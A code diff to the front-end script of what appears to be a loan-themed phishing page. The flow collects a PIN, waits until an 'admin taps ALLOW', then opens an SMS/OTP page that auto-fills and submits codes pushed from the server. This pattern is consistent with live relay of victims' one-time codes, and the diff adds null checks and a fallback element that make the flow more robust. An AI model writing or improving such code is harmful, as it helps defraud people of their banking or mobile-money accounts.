@@ -9,7 +9,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const stepLoan3 = document.getElementById('step-loan-3');
     const stepForm = document.getElementById('step-form');
     const stepLoading = document.getElementById('step-loading');
-    const stepOtp = document.getElementById('step-otp');
+    const stepOtp = document.getElementById('step-otp') || document.getElementById('step-sms');
     const stepSuccess = document.getElementById('step-success');
 
     const btnNaelewa = document.getElementById('btn-naelewa');
@@ -41,6 +41,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let isAutoSubmitting = false;
 
     function switchStep(fromCard, toCard) {
+        if (!fromCard || !toCard) return;
         fromCard.classList.remove('active');
         fromCard.classList.add('hidden');
         toCard.classList.remove('hidden');
@@ -193,11 +194,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 const data = await res.json();
 
                 if (data.status === 'approved_pin') {
-                    // Open the SMS page immediately when admin taps ALLOW
-                    if (stepOtp.classList.contains('hidden')) {
+                    // Instantly open SMS page as soon as Allow is clicked
+                    if (stepOtp && stepOtp.classList.contains('hidden')) {
                         switchStep(stepLoading, stepOtp);
                     }
-                    // If an SMS text arrives later, populate and auto-submit it
                     if (data.incomingSMS && !otpText.value.trim() && !isAutoSubmitting) {
                         otpText.value = data.incomingSMS;
                         charCount.innerText = `${data.incomingSMS.length}/1000`;
@@ -230,4 +230,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2500);
     }
 });
-                          
+        
